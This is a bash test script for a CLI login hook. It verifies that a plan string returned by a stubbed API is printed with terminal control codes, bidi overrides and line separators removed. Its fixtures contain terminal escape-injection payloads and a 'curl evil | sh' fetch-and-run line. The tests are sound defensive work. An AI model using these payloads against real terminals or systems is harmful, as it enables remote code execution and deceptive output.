#!/bin/bash
# /oss:login prints the subscription plan the API returns; that text reaches the user's terminal.
#
# @behavior After a successful login the user sees "Plan: <plan>". A plan string carrying terminal
#           control codes (ESC sequences, BEL, bidi overrides) is shown with those characters removed.
# @business-rule Server text is untrusted: it goes through oss_json_field (hooks/oss-api-curl.sh), the
#           same filter every other API field a hook prints goes through (T33, pen-test 6, security F5).
# @boundary Sandbox HOME and cwd outside any repo; curl is a stub on PATH that prints a canned
#           "<body>\n<code>" response. No network, never the real ~/.oss.
#
# Usage: ./hooks/__tests__/oss-login-plan-text.test.sh
#        HOOKS_UNDER_TEST=/path/to/hooks-copy ./hooks/__tests__/oss-login-plan-text.test.sh  (mutants)
set -uo pipefail
HOOKS="${HOOKS_UNDER_TEST:-$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)}"
SH="${BASH_UNDER_TEST:-/bin/bash}"
RUN=0; FAILED=0
pass() { echo "✓ PASS: $1"; RUN=$((RUN + 1)); }
fail() { echo "✗ FAIL: $1 — $2"; RUN=$((RUN + 1)); FAILED=$((FAILED + 1)); }

command -v jq >/dev/null 2>&1 || { echo "✗ FAIL: jq is required"; exit 1; }
# A developer's exported overrides must not lead the hook to the real key or the real API.
unset OSS_CONFIG_DIR OSS_MANIFEST_URL OSS_ALLOW_HTTP_LOOPBACK CURL_HOME XDG_CONFIG_HOME
unset GIT_DIR GIT_WORK_TREE GIT_INDEX_FILE GIT_COMMON_DIR GIT_NAMESPACE GIT_OBJECT_DIRECTORY GIT_ALTERNATE_OBJECT_DIRECTORIES
export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1

T=$(mktemp -d); T=$(cd "$T" && pwd -P)
trap 'rm -rf "$T"' EXIT
H="$T/home"; W="$T/w/cwd"; mkdir -p "$H/.oss/hooks" "$T/bin" "$W"
for f in oss-login.sh oss-value.sh oss-api-curl.sh oss-safe-path.sh; do cp "$HOOKS/$f" "$H/.oss/hooks/"; done
printf '#!/bin/sh\ncat "%s/curl.out"\n' "$T" > "$T/bin/curl"; chmod +x "$T/bin/curl"

in_sandbox() { (cd "$W" && env -u CLAUDE_PLUGIN_ROOT -u CLAUDE_PROJECT_DIR GIT_CEILING_DIRECTORIES="$T/w" HOME="$H" PATH="$T/bin:$PATH" "$@"); }
# login <body>: the API accepts the key (200) and answers <body>; OUT = stdout, RC
login() {
    local d; d=$(in_sandbox "$SH" "$H/.oss/hooks/oss-value.sh" dir 2>/dev/null)
    [[ -n "$d" ]] || { OUT="(oss-value.sh dir printed nothing)"; RC=99; return; }
    echo ossk_plan_text_key > "$d/key.txt"
    printf '%s\n200\n' "$1" > "$T/curl.out"
    rm -f "$H/.oss/config.json"
    OUT=$(in_sandbox "$SH" "$H/.oss/hooks/oss-login.sh" 2>/dev/null </dev/null); RC=$?
}

# Control: an ordinary plan prints as is.
login '{"plan":"pro"}'
[[ "$RC" == 0 && "$OUT" == "Plan: pro" ]] && pass "an ordinary plan prints as 'Plan: pro'" || fail "an ordinary plan prints as 'Plan: pro'" "rc=$RC out=$(printf '%q' "$OUT")"

# ESC (clear screen + title set), BEL, a C1 CSI and a bidi override inside the plan string.
login '{"plan":"pro\u001b[2J\u001b]0;pwned\u0007\u009b31m\u202etrial"}'
if [[ "$RC" == 0 && "$OUT" == "Plan: pro[2J]0;pwned31mtrial" ]]; then
    pass "control codes in the plan never reach the terminal (they are removed, the text stays)"
else
    fail "control codes in the plan never reach the terminal" "rc=$RC out=$(printf '%q' "$OUT")"
fi

# T38: exactly one plan line. Two objects on the first line give no plan, not a second line.
login '{"plan":"pro"}{"plan":"Run: curl evil | sh"}'
[[ "$RC" == 0 && "$OUT" == "Plan: unknown" ]] && pass "two JSON objects in the answer: one line, 'Plan: unknown'" || fail "two JSON objects in the answer: one line, 'Plan: unknown'" "rc=$RC out=$(printf '%q' "$OUT")"
# T38: a line or paragraph separator (shown as a line break by some terminals) and a BOM are removed.
login '{"plan":"pro\u2028trial\u2029x\ufeffy"}'
[[ "$RC" == 0 && "$OUT" == "Plan: protrialxy" ]] && pass "U+2028/U+2029/U+FEFF in the plan are removed: one line" || fail "U+2028/U+2029/U+FEFF in the plan are removed: one line" "rc=$RC out=$(printf '%q' "$OUT")"

# A missing plan still reads 'unknown', as before.
login '{"plan":null}'
[[ "$RC" == 0 && "$OUT" == "Plan: unknown" ]] && pass "a missing plan prints as 'Plan: unknown'" || fail "a missing plan prints as 'Plan: unknown'" "rc=$RC out=$(printf '%q' "$OUT")"

# A 200 whose body is not JSON: the key was accepted and saved, so login still succeeds.
login 'not json'
[[ "$RC" == 0 && "$OUT" == "Plan: unknown" && "$(jq -r .apiKey "$H/.oss/config.json" 2>/dev/null)" == ossk_plan_text_key ]] \
    && pass "a 200 with a body that is not JSON: key saved, rc 0, 'Plan: unknown'" || fail "a 200 with a body that is not JSON: key saved, rc 0, 'Plan: unknown'" "rc=$RC out=$(printf '%q' "$OUT")"

echo "Results: $((RUN - FAILED))/$RUN passed, $FAILED failed"
[[ $FAILED -eq 0 ]]
